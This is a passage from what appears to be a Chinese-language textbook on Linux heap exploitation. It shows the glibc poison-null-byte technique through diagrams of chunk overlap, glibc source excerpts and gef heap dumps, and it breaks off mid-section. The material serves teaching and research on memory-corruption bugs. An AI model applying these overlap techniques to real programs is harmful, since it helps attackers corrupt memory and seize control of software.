t_chunk(P))
We malloc 'b1': 0xabb030
c.prev_size: 0x110
fake c.prev_size: 0x70
We malloc 'b2', our 'victim' chunk: 0xabb0c0
Now we free 'b1' and 'c', this will consolidate the chunks 'b1'
and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2': 0xabb030
b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAA
New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAA
该技术适用的场景需要某个 malloc 的内存区域存在一个单字节溢出漏洞。通过溢
出下一个 chunk 的 size 字段，攻击者能够在堆中创造出重叠的内存块，从而达到
改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。
对于单字节溢出的利用有下面几种：
扩展被释放块：当溢出块的下一块为被释放块且处于 unsorted bin 中，则通过
溢出一个字节来将其大小扩大，下次取得次块时就意味着其后的块将被覆盖而
造成进一步的溢出
475
3.1.7 Linux 堆利用（二）
0x100 0x100 0x80
|-------|-------|-------|
| A | B | C | 初始状态
|-------|-------|-------|
| A | B | C | 释放 B
|-------|-------|-------|
| A | B | C | 溢出 B 的 size 为 0x180
|-------|-------|-------|
| A | B | C | malloc(0x180-8)
|-------|-------|-------| C 块被覆盖
||
扩展已分配块：当溢出块的下一块为使用中的块，则需要合理控制溢出的字
节，使其被释放时的合并操作能够顺利进行，例如直接加上下一块的大小使其
完全被覆盖。下一次分配对应大小时，即可取得已经被扩大的块，并造成进一
步溢出
0x100 0x100 0x80
|-------|-------|-------|
| A | B | C | 初始状态
|-------|-------|-------|
| A | B | C | 溢出 B 的 size 为 0x180
|-------|-------|-------|
| A | B | C | 释放 B
|-------|-------|-------|
| A | B | C | malloc(0x180-8)
|-------|-------|-------| C 块被覆盖
||
收缩被释放块：此情况针对溢出的字节只能为 0 的时候，也就是本节所说的
poison-null-byte，此时将下一个被释放的块大小缩小，如此一来在之后分裂此
块时将无法正确更新后一块的 prev_size 字段，导致释放时出现重叠的堆块
476
3.1.7 Linux 堆利用（二）
0x100 0x210 0x80
|-------|---------------|-------|
| A | B | C | 初始状态
|-------|---------------|-------|
| A | B | C | 释放 B
|-------|---------------|-------|
| A | B | C | 溢出 B 的 size 为 0x200
|-------|---------------|-------| 之后的 malloc 操作没有更新 C 的
prev_size
0x100 0x80
|-------|------|-----|--|-------|
| A | B1 | B2 | | C | malloc(0x180-8), malloc(0x80
-8)
|-------|------|-----|--|-------|
| A | B1 | B2 | | C | 释放 B1
|-------|------|-----|--|-------|
| A | B1 | B2 | | C | 释放 C，C 将与 B1 合并
|-------|------|-----|--|-------|
| A | B1 | B2 | | C | malloc(0x180-8)
|-------|------|-----|--|-------| B2 将被覆盖
||
house of einherjar：也是溢出字节只能为 0 的情况，当它是更新溢出块下一块
的 prev_size 字段，使其在被释放时能够找到之前一个合法的被释放块并与其
合并，造成堆块重叠
477
3.1.7 Linux 堆利用（二）
0x100 0x100 0x101
|-------|-------|-------|
| A | B | C | 初始状态
|-------|-------|-------|
| A | B | C | 释放 A
|-------|-------|-------|
| A | B | C | 溢出 B，覆盖 C 块的 size 为 0x200，并使
其 prev_size 为 0x200
|-------|-------|-------|
| A | B | C | 释放 C
|-------|-------|-------|
| A | B | C | C 将与 A 合并
|-------|-------|-------| B 块被重叠
||
首先分配三个 chunk，第一个 chunk 类型无所谓，但后两个不能是 fast chunk，因
为 fast chunk 在释放后不会被合并。这里 chunk a 用于制造单字节溢出，去覆盖
chunk b 的第一个字节，chunk c 的作用是帮助伪造 fake chunk。
首先是溢出，那么就需要知道一个堆块实际可用的内存大小（因为空间复用，可能
会比分配时要大一点），用于获得该大小的函数 malloc_usable_size 如下：
478
3.1.7 Linux 堆利用（二）
/*
------------------------- malloc_usable_size ----------------
---------
*/
static size_t
musable (void *mem)
{
mchunkptr p;
if (mem != 0)
{
p = mem2chunk (mem);
[...]
if (chunk_is_mmapped (p))
return chunksize (p) - 2 * SIZE_SZ;
else if (inuse (p))
return chunksize (p) - SIZE_SZ;
}
return 0;
}
/* check for mmap()'ed chunk */
#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)
/* extract p's inuse bit */
#define inuse(p) \
((((mchunkptr) (((char *) (p)) + ((p)->size & ~SIZE_BITS)))->s
ize) & PREV_INUSE)
/* Get size, ignoring use bits */
#define chunksize(p) ((p)->size & ~(SIZE_BITS))
所以 real_a_size = chunksize(a) - 0x8 == 0x18 。另外需要注意的是程序
是通过 next chunk 的 PREV_INUSE 标志来判断某 chunk 是否被使用的。
为了在修改 chunk b 的 size 字段后，依然能通过 unlink 的检查，我们需要伪造一
个 c.prev_size 字段，字段的大小是很好计算的，即 0x100 == (0x111 &
0xff00) ，正好是 NULL 字节溢出后的值。然后把 chunk b 释放掉，chunk b 随后
被放到 unsorted bin 中，大小是 0x110。此时的堆布局如下：
479
3.1.7 Linux 堆利用（二）
gef➤ x/42gx a-0x10
0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk
a
0x603010: 0x0000000000000000 0x0000000000000000
0x603020: 0x0000000000000000 0x0000000000000111 <-- chunk
b [be freed]
0x603030: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- f
d, bk pointer
0x603040: 0x0000000000000000 0x0000000000000000
0x603050: 0x0000000000000000 0x0000000000000000
0x603060: 0x0000000000000000 0x0000000000000000
0x603070: 0x0000000000000000 0x0000000000000000
0x603080: 0x0000000000000000 0x0000000000000000
0x603090: 0x0000000000000000 0x0000000000000000
0x6030a0: 0x0000000000000000 0x0000000000000000
0x6030b0: 0x0000000000000000 0x0000000000000000
0x6030c0: 0x0000000000000000 0x0000000000000000
0x6030d0: 0x0000000000000000 0x0000000000000000
0x6030e0: 0x0000000000000000 0x0000000000000000
0x6030f0: 0x0000000000000000 0x0000000000000000
0x603100: 0x0000000000000000 0x0000000000000000
0x603110: 0x0000000000000000 0x0000000000000000
0x603120: 0x0000000000000100 0x0000000000000000 <-- f
ake c.prev_size
0x603130: 0x0000000000000110 0x0000000000000090 <-- chunk
c
0x603140: 0x0000000000000000 0x0000000000000000
gef➤ heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603020, bk=0x603020
→ Chunk(addr=0x603030, size=0x110, flags=PREV_INUSE)
最关键的一步，通过溢出漏洞覆写 chunk b 的数据：
480
3.1.7 Linux 堆利用（二）
gef➤ x/42gx a-0x10
0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk
a
0x603010: 0x0000000000000000 0x0000000000000000
0x603020: 0x0000000000000000 0x0000000000000100 <-- chunk
b [be freed]
0x603030: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- f
d, bk pointer
0x603040: 0x0000000000000000 0x0000000000000000
0x603050: 0x0000000000000000 0x0000000000000000
0x603060: 0x0000000000000000 0x0000000000000000
0x603070: 0x0000000000000000 0x0000000000000000
0x603080: 0x0000000000000000 0x0000000000000000
0x603090: 0x0000000000000000 0x0000000000000000
0x6030a0: 0x0000000000000000 0x0000000000000000
0x6030b0: 0x0000000000000000 0x0000000000000000
0x6030c0: 0x0000000000000000 0x0000000000000000
0x6030d0: 0x0000000000000000 0x0000000000000000
0x6030e0: 0x0000000000000000 0x0000000000000000
0x6030f0: 0x0000000000000000 0x0000000000000000
0x603100: 0x0000000000000000 0x0000000000000000
0x603110: 0x0000000000000000 0x0000000000000000
0x603120: 0x0000000000000100 0x0000000000000000 <-- f
ake c.prev_size
0x603130: 0x0000000000000110 0x0000000000000090 <-- chunk
c
0x603140: 0x0000000000000000 0x0000000000000000
gef➤ heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603020, bk=0x603020
→ Chunk(addr=0x603030, size=0x100, flags=)
这时，根据我们上一篇文字中讲到的计算方法：
chunksize(P) == *((size_t*)(b-0x8)) & (~ 0x7) == 0x100
prev_size (next_chunk(P)) == *(size_t*)(b-0x10 + 0x100) ==
0x100
可以成功绕过检查。另外 unsorted bin 中的 chunk 大小也变成了 0x100。
481
3.1.7 Linux 堆利用（二）
接下来随意分配两个 chunk，malloc 会从 unsorted bin 中划出合适大小的内存返回
给用户：
gef➤ x/42gx a-0x10
0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk
a
0x603010: 0x0000000000000000 0x0000000000000000
0x603020: 0x0000000000000000 0x0000000000000091 <-- chunk
b1 <-- fake chunk b
0x603030: 0x4141414141414141 0x4141414141414141
0x603040: 0x4141414141414141 0x4141414141414141
0x603050: 0x4141414141414141 0x4141414141414141
0x603060: 0x4141414141414141 0x4141414141414141
0x603070: 0x4141414141414141 0x4141414141414141
0x603080: 0x4141414141414141 0x4141414141414141
0x603090: 0x4141414141414141 0x4141414141414141
0x6030a0: 0x4141414141414141 0x4141414141414141
0x6030b0: 0x0000000000000000 0x0000000000000051 <-- chunk
b2 <-- 'victim' chunk
0x6030c0: 0x4141414141414141 0x4141414141414141
0x6030d0: 0x4141414141414141 0x4141414141414141
0x6030e0: 0x4141414141414141 0x4141414141414141
0x6030f0: 0x4141414141414141 0x4141414141414141
0x603100: 0x0000000000000000 0x0000000000000021 <-- unsor
ted bin
0x603110: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- f
d, bk pointer
0x603120: 0x0000000000000020 0x0000000000000000 <-- f
ake c.prev_size
0x603130: 0x0000000000000110 0x0000000000000090 <-- chunk
c
0x603140: 0x0000000000000000 0x0000000000000000
gef➤ heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603100, bk=0x603100
→ Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE)
482
3.1.7 Linux 堆利用（二）
这里有个很有趣的东西，分配堆块后，发生变化的是 fake c.prev_size，而不是
c.prev_size。所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x110 的 free
chunk。但其实这片内存已经被分配给了 chunk b1。
接下来是见证奇迹的时刻，我们知道，两个相邻的 small chunk 被释放后会被合并
在一起。首先释放 chunk b1，伪造出 fake chunk b 是 free chunk 的样子。然后释
放 chunk c，这时程序会发现 chunk c 的前一个 chunk 是一个 free chunk，然后就
将它们合并在了一起，并从 unsorted bin 中取出来合并进了 top chunk。可怜的
chunk 2 位于 chunk b1 和 chunk c 之间，被直接无视了，现在 malloc 认为这整块
区域都是未分配的，新的 top chunk 指针已经说明了一切。
483
3.1.7 Linux 堆利用（二）
gef➤ x/42gx a-0x10
0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk
a
0x603010: 0x0000000000000000 0x0000000000000000
0x603020: 0x0000000000000000 0x0000000000020fe1 <-- top c
hunk
0x603030: 0x0000000000603100 0x00007ffff7dd1b78
0x603040: 0x4141414141414141 0x4141414141414141
0x603050: 0x4141414141414141 0x4141414141414141
0x603060: 0x4141414141414141 0x4141414141414141
0x603070: 0x4141414141414141 0x4141414141414141
0x603080: 0x4141414141414141 0x4141414141414141
0x603090: 0x4141414141414141 0x4141414141414141
0x6030a0: 0x4141414141414141 0x4141414141414141
0x6030b0: 0x0000000000000090 0x0000000000000050 <-- chunk
b2 <-- 'victim' chunk
0x6030c0: 0x4141414141414141 0x4141414141414141
0x6030d0: 0x4141414141414141 0x4141414141414141
0x6030e0: 0x4141414141414141 0x4141414141414141
0x6030f0: 0x4141414141414141 0x4141414141414141
0x603100: 0x0000000000000000 0x0000000000000021 <-- unsor
ted bin
0x603110: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- f
d, bk pointer
0x603120: 0x0000000000000020 0x0000000000000000
0x603130: 0x0000000000000110 0x0000000000000090
0x603140: 0x0000000000000000 0x0000000000000000
gef➤ heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603100, bk=0x603100
→ Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE)
chunk 合并的过程如下，首先该 chunk 与前一个 chunk 合并，然后检查下一个
chunk 是否为 top chunk，如果不是，将合并后的 chunk 放回 unsorted bin 中，否
则，合并进 top chunk：
484
3.1.7 Linux 堆利用（二）
/* consolidate backward */